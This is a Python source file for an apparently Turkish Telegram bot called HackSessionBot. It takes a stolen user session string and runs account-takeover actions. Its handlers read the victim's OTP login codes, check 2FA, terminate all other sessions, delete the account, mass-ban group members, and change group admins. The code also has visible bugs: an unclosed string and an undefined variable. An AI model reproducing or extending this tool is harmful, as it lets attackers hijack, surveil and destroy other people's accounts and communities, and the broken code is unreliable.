import os
from HackSessionBot import app,API_ID,API_HASH
from pyrogram import filters , Client
from HackSessionBot.Helpers.steve import (
    users_gc,
    user_info,
    banall,
    get_otp,
    join_ch,
    leave_ch,
    del_ch,
    check_2fa,
    terminate_all,
    del_acc,
    piromote,
    demote_all)
from HackSessionBot.Helpers.data import HACK_MODS 
from pyrogram.types import CallbackQuery 
from pyrogram.raw import functions
from telethon import TelegramClient 
from telethon.sessions import StringSession 



@app.on_callback_query(filters.regex("A"))
async def a_callback(client : Client , query : CallbackQuery):
    chat_id = query.message.chat.id
    session = await client.ask(chat_id,"Bana kullanıcının Sessionu'nu ver.")    
    ch = await users_gc(session.text)
    if len(ch) > 3855:
        file = open("session.txt", "w")
        file.write(ch)
        file.close()
        await client.send_document(chat_id, "session.txt")
        os.system("rm -rf session.txt")
    else:
        await query.message.reply_text(text = ch + "\n\n**Başarıyla Tamamlandı Owner @goktuResmi 💻)**",
            reply_markup=HACK_MODS,
            disable_web_page_preview=True)

    
@app.on_callback_query(filters.regex("B"))
async def b_callback(client : Client, query : CallbackQuery):
    id = query.message.chat.id   
    session = await client.ask(id,"Bana kullanıcının Sessionu'nu ver.")
    info = await user_info(session.text)
    await query.message.reply_text(text = info + "\n\n**Başarıyla Tamamlandı Owner @goktuResmi 💻)**",
            reply_markup=HACK_MODS,
            disable_web_page_preview=True)

@app.on_callback_query(filters.regex("C"))
async def c_callback(client : Client, query : CallbackQuery):
    id = query.message.chat.id   
    session = await client.ask(id,"Bana kullanıcının Sessionu'nu ver.")
    gc = await client.ask(id,"Bana Grup Adını Ver Yada İd'sini Ver. ") 
    hehe = await banall(session.text,gc)
    await query.message.reply_text(text = hehe + "\n\n**Başarıyla Tamamlandı Owner @goktuResmi 💻)**",
            reply_markup=HACK_MODS,
            disable_web_page_preview=True)

@app.on_callback_query(filters.regex("D"))
async def d_callback(client : Client, query : CallbackQuery):
    id = query.message.chat.id   
    session = await client.ask(id,"Bana kullanıcının Sessionu'nu ver.")
    hehe = await get_otp(session.text)
    await query.message.reply_text(text = hehe + "\n\n**Başarıyla Tamamlandı Owner @goktuResmi 💻)**",
            reply_markup=HACK_MODS,
            disable_web_page_preview=True)

@app.on_callback_query(filters.regex("E"))
async def e_callback(client : Client, query : CallbackQuery):
    id = query.message.chat.id   
    session = await client.ask(id,"Bana kullanıcının Sessionu'nu ver.)
    gc = await client.ask(id,"Bana Grup Kullanıcı Adını Yada Grup İd'sini Ver.") 
    hehe = await join_ch(session.text,gc)
    await query.message.reply_text(text = hehe + "\n\n**Başarıyla Tamamlandı Owner @goktuResmi 💻)**",
            reply_markup=HACK_MODS,
            disable_web_page_preview=True)

@app.on_callback_query(filters.regex("F"))
async def f_callback(client : Client, query : CallbackQuery):
    id = query.message.chat.id   
    session = await client.ask(id,"Bana kullanıcının Sessionu'nu ver.")
    gc = await client.ask(id,"Bana Grup Kullanıcı Adı Yada İd'sini Ver.") 
    hehe = await leave_ch(session.text,gc)
    await query.message.reply_text(text = hehe + "\n\n**Başarıyla Tamamlandı Owner @goktuResmi 💻)**",
            reply_markup=HACK_MODS,
            disable_web_page_preview=True)

@app.on_callback_query(filters.regex("G"))
async def g_callback(client : Client, query : CallbackQuery):
    id = query.message.chat.id   
    session = await client.ask(id,"Bana kullanıcının Sessionu'nu ver.")
    gc = await client.ask(id,"Bana Grup Kullanıcı Adı Yada İd'sini Ver.") 
    hehe = await del_ch(session.text,gc)
    await query.message.reply_text(text = hehe + "\n\n**Başarıyla Tamamlandı Owner @goktuResmi 💻)**",
            reply_markup=HACK_MODS,
            disable_web_page_preview=True)


@app.on_callback_query(filters.regex("H"))
async def h_callback(client : Client, query : CallbackQuery):
    id = query.message.chat.id   
    session = await client.ask(id,"Bana kullanıcının Sessionu'nu ver.")
    hehe = await check_2fa(session.text)
    await query.message.reply_text(text = hehe + "\n\n**Başarıyla Tamamlandı Owner @goktuResmi 💻)**",
            reply_markup=HACK_MODS,
            disable_web_page_preview=True)

@app.on_callback_query(filters.regex("I"))
async def i_callback(client : Client, query : CallbackQuery):
    id = query.message.chat.id   
    session = await client.ask(id,"Bana kullanıcının Sessionu'nu ver.")
    hehe = await terminate_all(session.text)
    await query.message.reply_text(text = hehe + "\n\n**Başarıyla Tamamlandı Owner @goktuResmi 💻)**",
            reply_markup=HACK_MODS,
            disable_web_page_preview=True)

@app.on_callback_query(filters.regex("J"))
async def j_callback(client : Client, query : CallbackQuery):
    id = query.message.chat.id   
    session = await client.ask(id,"Bana kullanıcının Sessionu'nu ver.")    
    hehe = await del_acc(session.text)
    await query.message.reply_text(text = hehe + "\n\n**Başarıyla Tamamlandı Owner @goktuResmi 💻)**",
            reply_markup=HACK_MODS,
            disable_web_page_preview=True)

@app.on_callback_query(filters.regex("K"))
async def k_callback(client : Client, query : CallbackQuery):
    id = query.message.chat.id   
    session = await client.ask(id,"Bana kullanıcının Sessionu'nu ver.")    
    user_id = await client.ask(id,"Yetki Vereceğim Kullanıcının İd'si Yada Kullanıcı Adını Ver.")
    gc_id = await client.ask(id,"Yetki Vereceğim Grup İd'si Yada Kullanıcı Adı Ver.")
    hehe = await piromote(session.text,gc_id,user_id)
    await query.message.reply_text(text = hehe + "\n\n**Başarıyla Tamamlandı Owner @goktuResmi 💻)**",
            reply_markup=HACK_MODS,
            disable_web_page_preview=True)

@app.on_callback_query(filters.regex("L"))
async def l_callback(client : Client, query : CallbackQuery):
    id = query.message.chat.id   
    session = await client.ask(id,"Bana kullanıcının Sessionu'nu ver.")    
    gc_id = await client.ask(id,"Bana Grup İd'si Yada Kullanıcı Adını Ver Bütün Yöneticileri Çıkarayım.")
    hehe = await demote_all(session.text,gc_id,user_id)
    await query.message.reply_text(text = hehe + "\n\n**Başarıyla Tamamlandı Owner @goktuResmi 💻)**",
            reply_markup=HACK_MODS,
            disable_web_page_preview=True)


